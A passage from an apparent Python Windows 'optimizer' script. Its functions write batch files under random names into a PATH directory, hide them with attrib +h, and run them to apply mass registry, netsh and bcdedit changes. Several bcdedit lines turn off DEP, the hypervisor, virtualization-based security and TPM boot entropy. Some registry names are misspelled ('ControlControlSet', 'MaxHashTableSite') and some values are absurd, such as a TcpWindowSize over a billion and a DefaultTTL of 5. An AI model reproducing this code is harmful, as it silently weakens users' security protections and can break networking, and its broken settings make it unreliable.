Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpWindowSize" /t REG_DWORD /d "1130458716" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpAckFrequency" /t REG_DWORD /d "70653669" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSite" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSite" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSite" /t REG_DWORD /d "64240" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSite" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SitReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Site" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f

    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Hardcore3():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    bcdedit /set useplatformtick yes
    bcdedit /timeout 0
    bcdedit /set nx optout
    bcdedit /set bootux disabled
    bcdedit /set bootmenupolicy standard
    bcdedit /set hypervisorlaunchtype off
    bcdedit /set tpmbootentropy ForceDisable
    bcdedit /set quietboot yes
    bcdedit /set {globalsettings} custom:16000067 true
    bcdedit /set {globalsettings} custom:16000069 true
    bcdedit /set {globalsettings} custom:16000068 true
    bcdedit /set linearaddress57 OptOut
    bcdedit /set increaseuserva 268435328
    bcdedit /set firstmegabytepolicy UseAll
    bcdedit /set avoidlowmemory 0x8000000
    bcdedit /set nolowmem Yes
    bcdedit /set allowedinmemorysettings 0x0
    bcdedit /set isolatedcontext No
    bcdedit /set vsmlaunchtype Off
    bcdedit /set vm No
    bcdedit /set configaccesspolicy Default
    bcdedit /set MSI Default
    bcdedit /set usephysicaldestination No
    bcdedit /set usefirmwarepcisettings No''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Hardcore4():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "28" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NumTcbTablePartitions" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCmds" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxThreads" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCollectionCount" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "DisableLargeMtu" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "983040" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "125" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "20" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEntries" /t REG_DWORD /d "512" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheTimeout" /t REG_DWORD /d "96" /f
netsh int ip reset C:/resetlog.txt
netsh winsock reset
ipconfig /flushdns
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    os.system('cls')
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Hardcore5():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
for /f "usebackq" %%i in (`reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces`) do (
Reg.exe add %%i /v "TcpAckFrequency" /d "1" /t REG_DWORD /f
Reg.exe add %%i /v "TCPNoDelay" /d "1" /t REG_DWORD /f
Reg.exe add %%i /v "TCPDelAckTicks" /d "0" /t REG_DWORD /f
Reg.exe add %%i /v "TcpWindowSize" /d "65535" /t REG_DWORD /f
)
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCmds" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxThreads" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCollectionCount" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "DisableLargeMtu" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "983040" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "125" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "301" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "384" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "20" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEntries" /t REG_DWORD /d "512" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheTimeout" /t REG_DWORD /d "96" /f
netsh int ip reset C:/resetlog.txt
netsh winsock reset
ipconfig /flushdns
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)

def Player1():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    netsh interface ipv4 set subinterface "Ethernet" mtu=1500 store=persistent
cls
netsh interface ipv4 set subinterface "Wi-Fi" mtu=1500 store=persistent
cls
netsh int tcp set global maxsynretransmissions=8
cls
netsh int tcp set global rss=enabled
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=1640 store=persistent
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global dca=enabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set global ecncapability=disabled
cls
ping -n 3 localhost>nul
